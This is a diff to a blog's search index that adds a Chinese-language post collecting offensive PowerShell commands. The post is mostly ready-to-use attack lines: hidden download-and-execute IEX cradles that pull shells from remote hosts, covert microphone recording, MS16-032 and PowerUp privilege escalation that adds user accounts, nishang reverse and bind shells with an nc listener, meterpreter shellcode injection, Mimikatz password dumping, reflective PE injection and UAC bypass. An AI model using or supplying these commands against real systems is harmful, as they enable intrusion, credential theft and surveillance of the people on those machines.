@@ -4,6 +4,112 @@
   
     
     <entry>
+      <title><![CDATA[Powershell的一些Commands收集]]></title>
+      <url>http://qinshenhui.github.io/2017/07/13/Powershell%E7%9A%84%E4%B8%80%E4%BA%9BCommands%E6%94%B6%E9%9B%86/</url>
+      <content type="html"><![CDATA[<p>#Powershell的一些Commands收集<br>传送门:<br><a href="https://github.com/samratashok/nishang" target="_blank" rel="external">nishang</a><br><a href="https://github.com/besimorhino/powercat" target="_blank" rel="external">powercat</a><br><a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="external">powersploit</a></p>
+<p>首先是基础的命令</p>
+<blockquote>
+<p>. .\*.ps1  </p>
+</blockquote>
+<p>加载文件 注意中间的空格</p>
+<p>##下载文件的两种方式</p>
+<blockquote>
+<p> (New-Object System.Net.Webclient).DownloadString()<br>   (New-Object System.Net.Webclient).DownloadFile()</p>
+</blockquote>
+<p>载入文件并执行</p>
+<blockquote>
+<p> powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://192.168.1.1:80/shell&#39;));shell" target="_blank" rel="external">http://192.168.1.1:80/shell&#39;));shell</a>“<br> powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(‘127.0.0.1//text.jpg’,’C:\Users\Public\test.jpg’) &amp; start C:\Users\Public\test.jpg</p>
+</blockquote>
+<p>##录音</p>
+<blockquote>
+<p>powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&#39;);Get-MicrophoneAudio" target="_blank" rel="external">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&#39;);Get-MicrophoneAudio</a> -Path $env:TEMP\secret.wav -Length 10 -Alias ‘SECRET’”</p>
+</blockquote>
+<p>##提权加账号<br>使用ms16-032提权</p>
+<blockquote>
+<p>Invoke-MS16-032 -Application cmd.exe -commandline ‘/c net user test123 test123 /add’”<br><a href="https://github.com/Jens472/Invoke-MS16-032" target="_blank" rel="external">https://github.com/Jens472/Invoke-MS16-032</a></p>
+</blockquote>
+<p>##shell连接<br>使用nishang框架的shells目录下工具</p>
+<blockquote>
+<p>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://ip/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp" target="_blank" rel="external">http://ip/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp</a> -Reverse -IPAddress ip -port 8888</p>
+</blockquote>
+<p>同时使用nc来接受反向连接shell</p>
+<blockquote>
+<p>nc -lvvp 8888</p>
+</blockquote>
+<p>反弹meterpreter(使用powersploit)</p>
+<blockquote>
+<p>IEX(New-Object Net.WebClient).DownloadString(‘<a href="http://ip/CodeExecution/Invoke-Shellcode-Old.ps1" target="_blank" rel="external">http://ip/CodeExecution/Invoke-Shellcode-Old.ps1</a>‘)<br>Invoke-Shellcode -payload windows/meterpreter/reverse_https -lhost ip -lport 4444 -force</p>
+</blockquote>
+<p>直连<br>目标机</p>
+<blockquote>
+<p>Invoke-PowerShellTcp -Bind -Port 8888</p>
+</blockquote>
+<p>攻击机使用powercat连接</p>
+<blockquote>
+<p>powercat -c 192.168.52.1 -v -p 8888</p>
+</blockquote>
+<p>##Mimikatz脱密码<br>powersploit中</p>
+<blockquote>
+<blockquote>
+<p>IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz" target="_blank" rel="external">http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</a></p>
+</blockquote>
+</blockquote>
+<p>##PE注入<br>powersploit框架中的</p>
+<blockquote>
+<p>Invoke-ReflectivePEInjection<br>Invoke-DllInjection<br>Invoke-Shellcode</p>
+</blockquote>
+<p>在这里我只介绍下Invoke-ReflectivePEInjection的用法</p>
+<blockquote>
+<p>$p=[IO.File]::ReadAllBytes(‘shell.exe’)<br>Invoke-ReflectivePEInjection -PEBytes $p -ForceASLR          #新版本</p>
+</blockquote>
+<p>貌似在老版本才支持<code>-PEUrl</code>和<code>-PEPath</code>参数</p>
+<blockquote>
+<p>Invoke-ReflectivePEInjection -PEUrl <a href="http://192.168.1.101:8000//shell.exe" target="_blank" rel="external">http://192.168.1.101:8000//shell.exe</a>  -ForceASLR<br>Invoke-ReflectivePEInjection -PEPath .\shell.exe -ForceASLR</p>
+</blockquote>
+<p>同时可实现远程加载’无文件’渗透</p>
+<p>##获取实时屏幕<br>使用nishang的Show-TargetScreen.ps1脚本(需要使用火狐浏览器<br>bind模式</p>
+<blockquote>
+<p>Show-TargetScreen -Bind -Port port</p>
+</blockquote>
+<p>reverse模式</p>
+<blockquote>
+<p>Show-TargetScreen -Reverse -IPAddress ip -Port port</p>
+</blockquote>
+<p>##Powerup提权<br>使用powersploit中的powerup</p>
+<blockquote>
+<p>. .\powerup.ps1<br>Invoke-AllChecks</p>
+</blockquote>
+<p>在<code>AbuseFunction</code>中显示利用的代码</p>
+<p>以<code>wampmysqld</code>为例</p>
+<blockquote>
+<p>ServiceName    : wampmysqld<br>Path           : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe wampmysqld<br>ModifiableFile : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe<br>StartName      : LocalSystem<br>AbuseFunction  : Install-ServiceBinary -ServiceName ‘wampmysqld’</p>
+<p>Install-ServiceBinary -ServiceName ‘wampmysqld’  -UserName 123 -Password 123</p>
+</blockquote>
+<p>当管理员运行后会自动添加账号</p>
+<p>最后在恢复文件</p>
+<blockquote>
+<p>Restore-ServiceBinary -ServiceName ‘wampmysqld’</p>
+</blockquote>
+<p>ms16-032提权:)</p>
+<p>##bypass UAC<br>nishang中的Invoke-PsUACme<br>直接载入Invoke-PsUACme,然后</p>
+<blockquote>
+<p>Invoke-PsUACme</p>
+</blockquote>
+<p>即可<br>其中有几个参数<br><code>-payload</code>:直接输入执行的命令,执行某个自定义程序需要在payload出填写绝对路径<br><code>-payloadpath</code>:加载的payload路径<br><code>-CustomDll64(32)</code>:加载自定义dll</p>
+<p>Ps:歪果仁对bypassUAC研究的博客<a href="https://enigma0x3.net/?s=uac" target="_blank" rel="external">https://enigma0x3.net/?s=uac</a></p>
+<p><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="external">UACME</a></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> powershell </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[debug基本用法]]></title>
       <url>http://qinshenhui.github.io/2017/03/23/debug%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
       <content type="html"><![CDATA[<p>#debug的基本用法</p>
